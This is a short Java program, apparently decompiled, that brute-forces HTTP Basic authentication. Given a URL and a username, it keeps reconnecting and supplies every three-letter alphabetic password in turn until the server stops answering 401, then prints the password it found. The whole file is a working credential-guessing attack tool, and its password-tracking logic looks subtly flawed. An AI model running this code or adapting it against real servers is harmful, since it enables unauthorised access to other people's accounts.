import java.net.PasswordAuthentication;
import java.io.IOException;
import java.net.ProtocolException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.Authenticator;
public class BruteForce extends Authenticator {
    private String f00;
    private URL f10;
    private char[] f20;
    private char[] f30;
    public static void main ( final String[] array ) {
        if ( array.length != 2 ) {
            System.err.println ( "usage: BruteForce <url> <username>" );
            System.exit ( 1 );
        }
        BruteForce bruteForce = null;
        try {
            bruteForce = new BruteForce ( array[0], array[1] );
        } catch ( MalformedURLException ex ) {
            ex.printStackTrace();
            System.exit ( 1 );
        }
        bruteForce.m00();
        System.exit ( 0 );
    }
    public BruteForce ( final String s, final String f00 ) throws MalformedURLException {
        this.f10 = new URL ( s );
        this.f00 = f00;
        this.f20 = new char[] { 'a' };
    }
    public void m00() {
        Authenticator.setDefault ( this );
        try {
            HttpURLConnection httpURLConnection = ( HttpURLConnection ) this.f10.openConnection();
            httpURLConnection.connect();
            while ( httpURLConnection.getResponseCode() == 401 && this.f20 != null ) {
                try {
                    httpURLConnection.getInputStream();
                    httpURLConnection.connect();
                } catch ( ProtocolException ex3 ) {
                    httpURLConnection = ( HttpURLConnection ) this.f10.openConnection();
                } catch ( NullPointerException ex ) {
                    ex.printStackTrace();
                    System.exit ( 1 );
                }
            }
        } catch ( IOException ex2 ) {
            ex2.printStackTrace();
            System.exit ( 1 );
        }
        System.out.println ( "password=" + new String ( this.f30 ) );
    }
    public PasswordAuthentication getPasswordAuthentication() {
        this.m20();
        return new PasswordAuthentication ( this.f00, this.f30 );
    }
    public void m20() {
        if ( this.f30 == null ) {
            this.f30 = new char[] { 'A', 'A', 'A' };
            this.f20 = new char[] { 'A', 'A', 'B' };
            return;
        }
        this.f30 = this.f20;
        if ( this.f20[2] == 'Z' ) {
            this.f20[2] = 'a';
            return;
        }
        if ( this.f20[2] != 'z' ) {
            ++this.f20[2];
        } else {
            this.f20[2] = 'A';
            if ( this.f20[1] == 'Z' ) {
                this.f20[1] = 'a';
            } else if ( this.f20[1] != 'z' ) {
                ++this.f20[1];
            } else {
                this.f20[1] = 'A';
                if ( this.f20[0] == 'Z' ) {
                    this.f20[0] = 'a';
                } else if ( this.f20[0] != 'z' ) {
                    ++this.f20[0];
                } else {
                    this.f20 = null;
                }
            }
        }
    }
}
